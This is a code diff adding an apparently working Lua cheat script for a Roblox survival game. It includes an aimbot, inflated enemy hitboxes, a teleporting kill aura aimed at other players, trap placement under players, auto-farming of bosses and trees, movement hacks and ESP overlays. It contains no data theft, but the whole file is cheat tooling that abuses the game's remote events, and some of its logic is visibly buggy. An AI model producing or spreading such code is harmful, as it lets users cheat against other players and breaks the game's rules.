+                                    local mag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(plrpos.X, plrpos.Y)).Magnitude
+                                    if mag < dist and (char.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude < dist then
+                                        if Wallcheck(char:FindFirstChild('HumanoidRootPart')) then
+                                            dist = mag
+                                            closest = char
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end     
+            end
+        end
+        return closest
+    end
+    if not getgenv().Updater then
+        getgenv().Updater = RunService.RenderStepped:Connect(function()
+            if getgenv().configs.PlayerLock then
+                if UserInputService:IsMouseButtonPressed(Enum.UserInputType.Mousebutton2) then
+                    if GetNearestPlayerToMouse() then
+                        CurrentlyLocked = GetNearestPlayerToMouse()
+                        local SmoothSnap = TweenService:Create(Camera, TweenInfo.new(0.01, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, CurrentlyLocked:FindFirstChild('HumanoidRootPart').Position)})
+                        SmoothSnap:Play()
+                        SmoothSnap.Completed:Wait()
+                    end
+                else
+                    if CurrentlyLocked ~= nil then
+                        CurrentlyLocked = nil
+                    end
+                end
+            end
+        end)
+    end
+end
+
+function Pumpkins()
+    while getgenv().configs.Pumpkins do
+        if getgenv().configs.Pumpkins then
+            task.wait()
+            if IsPlayerAlive(LocalPlayer) then
+                local hum = LocalPlayer.Character.Humanoid
+                if hum.Health < 75 then
+                    RemoteEvents['InventoryInteraction']:FireServer(378, "Eat")
+                end
+            end
+        end
+    end
+end
+
+function Hitbox()
+    while getgenv().configs.Hitbox do
+        if getgenv().configs.Hitbox then
+            task.wait(0.2)
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr ~= LocalPlayer then
+                    if IsPlayerAlive(plr) and plr.Character:FindFirstChild('Hitbox') then
+                        if plr.Character.Hitbox.Size ~= Vector3.new(20, 20, 20) then
+                            plr.Character.Hitbox.Size = Vector3.new(20, 20, 20)
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+function SafeDeath()
+    if getgenv().configs.SafeDeath then
+        if not SafeDeathHealthChecker then
+            SafeDeathHealthChecker = LocalPlayer.Character:WaitForChild('Humanoid').HealthChanged:Connect(function(health)
+                if getgenv().configs.SafeDeath then
+                    if not TeleportHappened then
+                        if health <= 35 then
+                            getgenv().configs.ZenLuckBoss = false
+                            getgenv().configs.SpiritBoss = false
+                            getgenv().configs.ObsidianBoss = false
+                            getgenv().configs.Ogre = false
+                            getgenv().configs.Squid = false
+                            getgenv().configs.LuckySlime = false
+                            getgenv().configs.EvilSkeleton = false
+                            local SavePlayer = TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(3, Enum.EasingStyle.Linear), {CFrame = CFrame.new(Vector3.new(7135, 73, 18677))})
+                            SavePlayer:Play()
+                            MakeAtlasNotification("You have been saved from death!", "The Arc Angels have saved you! Heal Up before you go back to battle!", 7)
+                            TeleportHappened = true
+                            TimeTped = tick()
+                        end
+                    else
+                        if tick() > TimeTped+TimeBetweenTps then
+                            TeleportHappened = false
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end
+
+function OpKillAura()
+    local wastrue = false
+    while getgenv().configs.OpKillAura do
+        if getgenv().configs.OpKillAura then
+            task.wait()
+			if OpKillAuraTable[1] then
+				if IsPlayerAlive(OpKillAuraTable[1]) and IsPlayerAlive(LocalPlayer) then
+					local myroot = LocalPlayer.Character.HumanoidRootPart
+					local enemyroot = OpKillAuraTable[1].Character.HumanoidRootPart
+					if getgenv().configs.PredictOpKillAura then
+						myroot.CFrame = CFrame.new(enemyroot.Position + (enemyroot.AssemblyLinearVelocity/getgenv().PredictAmount))
+					else
+						myroot.CFrame = CFrame.new(enemyroot.Position)
+					end
+					if LocalPlayer.Character.Humanoid.Health <= 20 then
+						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
+						MakeAtlasNotification("You are low!", 'Ive saved you. Heal up.', 8)
+					return end
+					MyYPos = LocalPlayer.Character.HumanoidRootPart.CFrame.Y
+					if MyYPos <= -800 then
+						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
+						MakeAtlasNotification("Suicide", "Careful, hes trying to suicide you", 3)
+					return end
+					RemoteEvents['ToolAction']:FireServer(OpKillAuraTable[1].Character)
+					if not getgenv().configs.OpKillAura and LocalPlayer.Character.Humanoid.Health > 25 then
+						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(enemyroot + Vector3.new(0, 25, 0))
+					end
+				end
+			end
+        end
+    end
+end
+
+function ConiferFarm()
+    local function GetClosestTree()
+        local range = math.huge
+        local closestree
+        for _, tree in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
+            if tree.Name == 'Conifer' then
+                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - tree:GetPivot().Position).magnitude
+                if dist < range then
+                    range = dist
+                    closestree = tree
+                end
+            end
+        end
+        return closestree
+    end
+
+    local function TreeFarm()
+        local ClosestTree
+        ClosestTree = GetClosestTree()
+        if ClosestTree then
+            repeat task.wait()
+                ClosestTree = GetClosestTree()
+                if not getgenv().configs.ConfierFarm then 
+                    if IsPlayerAlive(LocalPlayer) then
+                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X+10, LocalPlayer.Character.HumanoidRootPart.CFrame.Y, LocalPlayer.Character.HumanoidRootPart.CFrame.Z-10)
+                    end
+                    return
+                end
+                if losestTree.Parent then
+                    if IsPlayerAlive(LocalPlayer) then
+                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(ClosestTree:GetPivot().Position)
+                        RemoteEvents['ToolAction']:FireServer(ClosestTree)
+                    end
+                end
+            until not ClosestTree.Parent or not IsPlayerAlive(LocalPlayer) or not getgenv().configs.ConfierFarm
+        end
+    end
+    while getgenv().configs.ConfierFarm and task.wait() do
+        if not getgenv().configs.ConfierFarm then 
+            if IsPlayerAlive(LocalPlayer) then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X+10, LocalPlayer.Character.HumanoidRootPart.CFrame.Y, LocalPlayer.Character.HumanoidRootPart.CFrame.Z-10)
+            end
+        end
+        if IsPlayerAlive(LocalPlayer) then
+            if not Workspace:WaitForChild('Replicators'):WaitForChild('Both'):FindFirstChild('Conifer') then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X, 400, LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
+            else
+                TreeFarm()
+            end
+        end
+    end
+end
+
+function AutoRepairClub()
+    if getgenv().configs.AutoRepairClub then
+        local zenwastrue = false
+        local spiritwastrue = false
+        local obwastrue = false
+        for _, tool in pairs(MyInventory:GetChildren()) do
+            if tool.Name == 'Obsidian Club' then
+                if not getgenv().PercentChanged then
+                    getgenv().PercentChanged = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label'):GetPropertyChangedSignal("Text"):Connect(function()
+                        if not getgenv().configs.AutoRepairClub then
+                            getgenv().PercentChanged:Disconnect()
+                            getgenv().PercentChange = nil
+                            return
+                        end
+                        local percentdegraded = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label').Text:sub(1, 4)
+                        local checkdecimal = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label').Text:sub(3, 3)
+                        if checkdecimal == '.' then
+                            if tonumber(percentdegraded) <= 50.5 then
+                                local ClosestChest = GetClosestChest()
+                                if ClosestChest then
+                                    RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
+                                    RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
+                                    MakeAtlasNotification('Repaired', 'Club repaired', 1)
+                                    task.wait(0.2)
+                                    pcall(function()
+                                        if MyInventory:FindFirstChild('Obsidian Club') then
+                                            if MyInventory:FindFirstChild('Obsidian Club'):FindFirstChild('Bottom'):FindFirstChild('Equip'):FindFirstChild('TextLabel').Text == "Equip" then
+                                                RemoteEvents['InventoryInteraction']:FireServer(230, "Equip")
+                                            end
+                                        end
+                                    end)
+                                else
+                                    if getgenv().configs.ZenLuckBoss then
+                                        zenwastrue = true
+                                        getgenv().configs.ZenLuckBoss = false
+                                    elseif getgenv().configs.SpiritBoss then
+                                        spiritwastrue = true
+                                        getgenv().configs.SpiritBoss = false
+                                    elseif getgenv().configs.ObsidianBoss then
+                                        obwastrue = true
+                                        getgenv().configs.ObsidianBoss = false
+                                    end
+                                    if IsPlayerAlive(LocalPlayer) then
+                                        task.wait(0.2)
+                                        local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
+                                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(7296, 274, 18681))
+                                        task.wait(0.5)
+                                        RemoteEvents['CraftItem']:FireServer(11, Vector3.new(7303.52, 288, 18678.74), 0)
+                                        task.wait(0.5)
+                                        local ClosestChest = GetClosestChest()
+                                        if ClosestChest then
+                                            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
+                                            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
+                                            MakeAtlasNotification('Repaired', 'Club repaired', 1)
+
+                                            task.wait(0.2)
+                                            pcall(function()
+                                                if MyInventory:FindFirstChild('Obsidian Club') then
+                                                    if MyInventory:FindFirstChild('Obsidian Club'):FindFirstChild('Bottom'):FindFirstChild('Equip'):FindFirstChild('TextLabel').Text == "Equip" then
+                                                        RemoteEvents['InventoryInteraction']:FireServer(230, "Equip")
+                                                    end
+                                                end
+                                            end)
+                                            if zenwastrue then
+                                                zenwastrue = false
+                                                task.spawn(function()
+                                                    getgenv().configs.ZenLuckBoss = true
+                                                    ZenLuckBoss()
+                                                end)
+                                            elseif spiritwastrue then
+                                                spiritwastrue = false
+                                                task.spawn(function()
+                                                    getgenv().configs.SpiritBoss = true
+                                                    SpiritBoss()
+                                                end)
+                                            elseif obwastrue then
+                                                obwastrue = false
+                                                task.spawn(function()
+                                                    getgenv().configs.ObsidianBoss = true
+                                                    ObsidianBoss()
+                                                end)
+                                            else
+                                                LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                end
+            end
+        end
+    else
+        if getgenv().PercentChanged then
+            getgenv().PercentChanged:Disconnect()
+            getgenv().PercentChanged = nil
+        end
+    end
+end
+
+function TrapPlayer()
+    if IsPlayerAlive(LocalPlayer) then
+        local function GetClosestTrapPlayer()
+            local range = 70
+            local closest = nil
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
+                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
+                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
+                        if dist < range then
+                            range = dist
+                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
+                        end
+                    else
+                        if dist < range then
+                            range = dist
+                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
+                        end
+                    end
+                end
+            end
+            return closest
+        end
+        RemoteEvents['CraftItem']:FireServer(SWITCHEDITEMSTABLE[getgenv().configs.TrapType], GetClosestTrapPlayer(), 690)
+    end
+end
+
+function ObsidianBoss()
+    while getgenv().configs.ObsidianBoss do
+        if getgenv().configs.ObsidianBoss then
+            task.wait()
+            if getgenv().configs.KillAura == true then
+                getgenv().configs.KillAura = false
+            end
+            if IsPlayerAlive(LocalPlayer) then
+            local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem')
+                if not getgenv().configs.ZenLuckBoss and not getgenv().configs.SpiritBoss then
+                    if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
+                        if not AutoPickupOnObsidianDeath then
+                            AutoPickupOnObsidianDeath = Boss.AncestryChanged:Connect(function(golem, parent)
+                                if not getgenv().configs.ObsidianBoss then
+                                    AutoPickupOnObsidianDeath:Disconnect()
+                                    AutoPickupOnObsidianDeath = nil
+                                end
+                                if not parent then
+                                    task.wait(0.2)
+                                    AutoPickup()
+                                    if AutoPickupOnObsidianDeath then
+                                        AutoPickupOnObsidianDeath:Disconnect()
+                                        AutoPickupOnObsidianDeath = nil
+                                    end
+                                end
+                            end)
+                        end
+                        local bosspos = Boss.HumanoidRootPart.Position
+                        local myroot = LocalPlayer.Character.HumanoidRootPart
+                        if Boss.Humanoid.Health > 50 then
+                            myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
+                        else
+                            myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
+                        end
+                        RemoteEvents['ToolAction']:FireServer(Boss)
+                    end
+                end
+            end
+        end
+    end
+end
+
+function ZenLuckBoss()
+    local function AttackBoss()
+        local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Zenyte Golem') or Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Lucky Golem')
+        if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
+            if not AutoPickupOnZenLuckBossDeath then
+                AutoPickupOnZenLuckBossDeath = Boss.AncestryChanged:Connect(function(slime, parent)
+                    if not getgenv().configs.ZenLuckBoss then
+                        AutoPickupOnZenLuckBossDeath:Disconnect()
+                        AutoPickupOnZenLuckBossDeath = nil
+                    end
+                    if not parent then
+                        task.wait(0.2)
+                        AutoPickup()
+                        if AutoPickupOnZenLuckBossDeath then
+                            AutoPickupOnZenLuckBossDeath:Disconnect()
+                            AutoPickupOnZenLuckBossDeath = nil
+                        end
+                    end
+                end)
+            end
+            local bosspos = Boss.HumanoidRootPart.Position
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            if Boss.Humanoid.Health > 50 then
+                myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13, 0))
+            else
+                myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 10, 0))
+            end
+            RemoteEvents['ToolAction']:FireServer(Boss)
+        else
+            if not AutoPickupOnZenLuckBossDeath then
+                task.wait(1)
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1663, -460, -4558)
+                RemoteEvents['KeyDoor']:FireServer(Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):WaitForChild("Cave Door (z)"))
+            end
+        end
+    end
+    while getgenv().configs.ZenLuckBoss do
+        if getgenv().configs.ZenLuckBoss then
+            task.wait()
+            if getgenv().configs.KillAura == true then
+                getgenv().configs.KillAura = false
+            end
+            if IsPlayerAlive(LocalPlayer) then
+                local Soul = MyInventory:FindFirstChild('Soul')
+                if Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):FindFirstChild("Gem Clusters") then
+                    Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):FindFirstChild("Gem Clusters"):Destroy()
+                end
+                if getgenv().configs.ObsidianBoss then
+                    if not Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem') then
+                        AttackBoss()
+                    end
+                else
+                    AttackBoss()
+                end
+                if getgenv().configs.UseSoulKeys then
+                    if Soul and Soul:FindFirstChild('Top'):FindFirstChild('TextLabel') then
+                        local SoulAmount = string.match(Soul.Top.TextLabel.Text, '%d+')
+                        if tonumber(SoulAmount) >= 10 and not MyInventory:FindFirstChild('Soul Key') then
+                            RemoteEvents['CraftItem']:FireServer(220)
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+function SpiritBoss()
+    local function AttackBoss()
+        local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Zenyte Golem') or Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Lucky Golem')
+        if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
+            if not AutoPickupOnSpiritBossDeath then
+                AutoPickupOnSpiritBossDeath = Boss.AncestryChanged:Connect(function(slime, parent)
+                    if not getgenv().configs.SpiritBoss then
+                        AutoPickupOnSpiritBossDeath:Disconnect()
+                        AutoPickupOnSpiritBossDeath = nil
+                    end
+                    if not parent then
+                        task.wait(0.2)
+                        AutoPickup()
+                        if AutoPickupOnSpiritBossDeath then
+                            AutoPickupOnSpiritBossDeath:Disconnect()
+                            AutoPickupOnSpiritBossDeath = nil
+                        end
+                    end
+                end)
+            end
+            local bosspos = Boss.HumanoidRootPart.Position
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            if Boss.Humanoid.Health >= 50 then
+                TweenService:Create(myroot, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(-13, 18, 0))}):Play()
+            else
+                TweenService:Create(myroot, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(0, 22, 0))}):Play()
+            end
+            if not getgenv().configs.SpiritBoss == false then
+                TweenService:Create(myroot, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(25, 18, 0))}):Play()
+            end
+            RemoteEvents['ToolAction']:FireServer(Boss)
+        else
+            if not AutoPickupOnSpiritBossDeath then
+                task.wait(1)
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1663, -460, -4558)
+                RemoteEvents['KeyDoor']:FireServer(Workspace:WaitForChild('Map'):WaitForChild("Mushroom Boss Cave "):WaitForChild("Cave Door (d)"))
+            end
+        end
+    end
+    while getgenv().configs.ZenLuckBoss do
+        if getgenv().configs.ZenLuckBoss then
+            task.wait()
+            if getgenv().configs.KillAura == true then
+                getgenv().configs.KillAura = false
+            end
+            if IsPlayerAlive(LocalPlayer) then
+                local Soul = MyInventory:FindFirstChild('Soul')
+                if Workspace:FindFirstChild('PoisionMushroom') then
+                    Workspace:FindFirstChild('PoisionMushroom'):Destroy()
+                end
+                if getgenv().configs.ObsidianBoss then
+                    if not Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem') then
+                        AttackBoss()
+                    end
+                else
+                    AttackBoss()
+                end
+                if getgenv().configs.UseSoulKeys then
+                    if Soul and Soul:FindFirstChild('Top'):FindFirstChild('TextLabel') then
+                        local SoulAmount = string.match(Soul.Top.TextLabel.Text, '%d+')
+                        if tonumber(SoulAmount) >= 10 and not MyInventory:FindFirstChild('Soul Key') then
+                            RemoteEvents['CraftItem']:FireServer(220)
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+function LuckySlime()
+    while getgenv().configs.LuckySlime do
+        if getgenv().configs.LuckySlime then
+            task.wait()
+            if getgenv().configs.KillAura == true then
+                getgenv().configs.KillAura = false
+            end
+            if IsPlayerAlive(LocalPlayer) then
+                local Boss = Workspace:WaitForChild('Replicators'):WaitForChild('Both'):FindFirstChild('Lucky Slime')
+                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
+                    if not AutoPickuponLuckySlimeDeath then
+                        AutoPickuponLuckySlimeDeath = Boss.AncestryChanged:Connect(function(slime, parent)
+                            if not getgenv().configs.LuckySlime then
+                                AutoPickuponLuckySlimeDeath:Disconnect()
+                                AutoPickuponLuckySlimeDeath = nil
+                            end
+                            if not parent then
+                                task.wait(0.2)
+                                AutoPickup()
+                                if AutoPickuponLuckySlimeDeath then
+                                    AutoPickuponLuckySlimeDeath:Disconnect()
+                                    AutoPickuponLuckySlimeDeath = nil
+                                end
+                            end
+                        end)
+                    end
+                    local bosspos = Boss.HumanoidRootPart.Position
+                    local myroot = LocalPlayer.Character.HumanoidRootPart
+                    if Boss.Humanoid.Health > 50 then
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
+                    else
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
+                    end
+                    RemoteEvents['ToolAction']:FireServer(Boss)
+                end
+            end
+        end
+    end
+end
+
+function EvilSkeleton()
+    while getgenv().configs.EvilSkeleton do
+        if getgenv().configs.EvilSkeleton then
+            task.wait()
+            if getgenv().configs.KillAura == true then
+                getgenv().configs.KillAura = false
+            end
+            if IsPlayerAlive(LocalPlayer) then
+                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Evil Skeleton')
+                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
+                    if not AutoPickupOnSkeletonDeath then
+                        AutoPickupOnSkeletonDeath = Boss.AncestryChanged:Connect(function(slime, parent)
+                            if not getgenv().configs.EvilSkeleton then
+                                AutoPickupOnSkeletonDeath:Disconnect()
+                                AutoPickupOnSkeletonDeath = nil
+                            end
+                            if not parent then
+                                task.wait(0.2)
+                                AutoPickup()
+                                if AutoPickupOnSkeletonDeath then
+                                    AutoPickupOnSkeletonDeath:Disconnect()
+                                    AutoPickupOnSkeletonDeath = nil
+                                end
+                            end
+                        end)
+                    end
+                    local bosspos = Boss.HumanoidRootPart.Position
+                    local myroot = LocalPlayer.Character.HumanoidRootPart
+                    if Boss.Humanoid.Health > 50 then
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, -15, 0))
+                    else
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
+                    end
+                    if not getgenv().configs.EvilSkeleton then
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
+                    end
+                    RemoteEvents['ToolAction']:FireServer(Boss)
+                end
+            end
+        end
+    end
+end
+
+function Ogre()
+    while getgenv().configs.Ogre do
+        if getgenv().configs.Ogre then
+            task.wait()
+            if getgenv().configs.KillAura == true then
+                getgenv().configs.KillAura = false
+            end
+            if IsPlayerAlive(LocalPlayer) then
+                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Ogre')
+                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
+                    if not AutoPickupOnOgreDeath then
+                        AutoPickupOnOgreDeath = Boss.AncestryChanged:Connect(function(slime, parent)
+                            if not getgenv().configs.Ogre then
+                                AutoPickupOnOgreDeath:Disconnect()
+                                AutoPickupOnOgreDeath = nil
+                            end
+                            if not parent then
+                                task.wait(0.2)
+                                AutoPickup()
+                                if AutoPickupOnOgreDeath then
+                                    AutoPickupOnOgreDeath:Disconnect()
+                                    AutoPickupOnOgreDeath = nil
+                                end
+                            end
+                        end)
+                    end
+                    local bosspos = Boss.HumanoidRootPart.Position
+                    local myroot = LocalPlayer.Character.HumanoidRootPart
+                    if Boss.Humanoid.Health > 50 then
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
+                    else
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
+                    end
+                    RemoteEvents['ToolAction']:FireServer(Boss)
+                end
+            end
+        end
+    end
+end
+
+function Squid()
+    while getgenv().configs.Squid do
+        if getgenv().configs.Squid then
+            task.wait()
+            if getgenv().configs.KillAura == true then
+                getgenv().configs.KillAura = false
+            end
+            if IsPlayerAlive(LocalPlayer) then
+                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Captain Squid')
+                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
+                    if not AutoPickupOnSquidDeath then
+                        AutoPickupOnSquidDeath = Boss.AncestryChanged:Connect(function(slime, parent)
+                            if not getgenv().configs.Squid then
+                                AutoPickupOnSquidDeath:Disconnect()
+                                AutoPickupOnSquidDeath = nil
+                            end
+                            if not parent then
+                                task.wait(0.2)
+                                AutoPickup()
+                                if AutoPickupOnSquidDeath then
+                                    AutoPickupOnSquidDeath:Disconnect()
+                                    AutoPickupOnSquidDeath = nil
+                                end
+                            end
+                        end)
+                    end
+                    local bosspos = Boss.HumanoidRootPart.Position
+                    local myroot = LocalPlayer.Character.HumanoidRootPart
+                    if Boss.Humanoid.Health > 50 then
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, -15, 0))
+                    else
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
+                    end
+                    if not getgenv().configs.Squid then
+                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
+                    end
+                    RemoteEvents['ToolAction']:FireServer(Boss)
+                end
+            end
+        end
+    end
+end
+
+function InfJump()
+    getgenv().InfiniteJump = Mouse.KeyDown:Connect(function(Key)
+        if Key == " " then
+            if getgenv().configs.InfJump and IsPlayerAlive(LocalPlayer) then
+                LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState(3)
+            else
+                getgenv().InfiniteJump:Disconnect()
+            end
+        end
+    end)
+end
+
+function JumpPower()
+    while getgenv().configs.JumpPower do
+        if getgenv().configs.JumpPower then
+            task.wait()
+            if IsPlayerAlive(LocalPlayer) then
+                LocalPlayer.Character.Humanoid.JumpPower = 100
+            end
+        end
+    end
+end
+
+function ExtraSpeed()
+    while getgenv().configs.ExtraSpeed do
+        if getgenv().configs.ExtraSpeed then
+            task.wait()
+            if IsPlayerAlive(LocalPlayer) then
+                LocalPlayer.Character.Humanoid.WalkSpeed = 21
+            end
+        end
+    end
+end
+
+local ChrAddedFunc
+function PlayerEsp()
+    if getgenv().configs.PlayerEsp then
+        function EspOnPlayer(target)
+            local EspRenderStepped
+            local Boxoutline = Drawing.new('Square')
+            Boxoutline.Thickness = 1
+            Boxoutline.Filled = false
+            Boxoutline.Transparency = 1
+            Boxoutline.Color = Color3.new(0, 0, 0)
+            
+            local Box = Drawing.new('Square')
+            Box.Thickness = 1
+            Box.Transparency = 1
+            Box.Filled = false
+            Box.Color = Color3.fromRGB(0, 255, 0)
+            
+            local Healthbaroutline = Drawing.new('Square')
+            Healthbaroutline.Thickness = 1
+            Healthbaroutline.Filled = false
+            Healthbaroutline.Transparency = 1
+            Healthbaroutline.Color = Color3.new(0, 0, 0)
+            
+            local Healthbar = Drawing.new('Square')
+            Healthbar.Thickness = 1
+            Healthbar.Filled = false
+            Healthbar.Transparency = 1
+            Healthbar.Color = Color3.fromRGB(0, 255, 0)
+            EspRenderStepped = RunService.RenderStepped:Connect(function()
+                if getgenv().configs.PlayerEsp == false then
+                    if Boxoutline then
+                        Boxoutline:Remove()
+                    end
+                    if Box then
+                        Box:Remove()
+                    end
+                    if Healthbaroutline then
+                        Healthbaroutline:Remove()
+                    end
+                    if Healthbar then
+                        Healthbar:Remove()
+                    end
+                    if EspRenderStepped then
+                        EspRenderStepped:Disconnect()
+                    end
+                return end
+                if target then
+                    if IsPlayerAlive(target) then
+                        local HumPos, onScreen = Camera:WorldToViewportPoint(target.Character.HumanoidRootPart.Position)
+                        if onScreen then
+                            local headpos = Camera:WorldToViewportPoint(target.Character.Head.Position + Vector3.new(0, 0.5, 0))
+                            local LegPosition = Camera:WorldToViewportPoint(target.Character.HumanoidRootPart.Position - Vector3.new(0, 4.5, 0))
+                            
+                            Boxoutline.Size = Vector2.new(1050 / HumPos.Z, headpos.Y - LegPosition.Y)
+                            Boxoutline.Position = Vector2.new(HumPos.X - Boxoutline.Size.X / 2, HumPos.Y - Boxoutline.Size.Y / 2)
+                            Boxoutline.Visible = true
+                            
+                            Box.Size = Vector2.new(1050 / HumPos.Z, headpos.Y - LegPosition.Y)
+                            Box.Position = Vector2.new(HumPos.X - Box.Size.X / 2, HumPos.Y - Box.Size.Y / 2 )
+                            Box.Visible = true
+                            
+                            Healthbaroutline.Size = Vector2.new(2, headpos.Y - LegPosition.Y)
+                            Healthbaroutline.Position = Boxoutline.Position - Vector2.new(8, 0)
+                            Healthbaroutline.Visible = true
+                            
+                            Healthbar.Size = Vector2.new(2, (headpos.Y - LegPosition.Y) / (target.Character:FindFirstChildOfClass('Humanoid').MaxHealth / math.clamp(target.Character:FindFirstChildOfClass('Humanoid').Health, 0, target.Character:FindFirstChildOfClass('Humanoid').MaxHealth)))
+                            Healthbar.Position = Vector2.new(Box.Position.X - 8, Box.Position.Y + (1/Healthbar.Size.Y))
+                            Healthbar.Color = Color3.fromRGB(255, 0, 0):lerp(Color3.fromRGB(0, 255, 0), target.Character:FindFirstChildOfClass('Humanoid').Health / target.Character:FindFirstChildOfClass('Humanoid').MaxHealth)
+                            Healthbar.Visible = true
+                        else
+                            Boxoutline.Visible = false
+                            Box.Visible = false
+                            Healthbaroutline.Visible = false
+                            Healthbar.Visible = false
+                        end
+                    else
+                        Boxoutline.Visible = false
+                        Box.Visible = false
+                        Healthbaroutline.Visible = false
+                        Healthbar.Visible = false
+                    end
+                end
+            end)
+        end
+        for _, plr in pairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer then
+                EspOnPlayer(plr)
+            end
+        end
+        if not ChrAddedFunc then
+            ChrAddedFunc = Players.PlayerAdded:Connect(function(plr)
+                if not getgenv().configs.PlayerEsp then
+                    ChrAddedFunc:Disconnect()
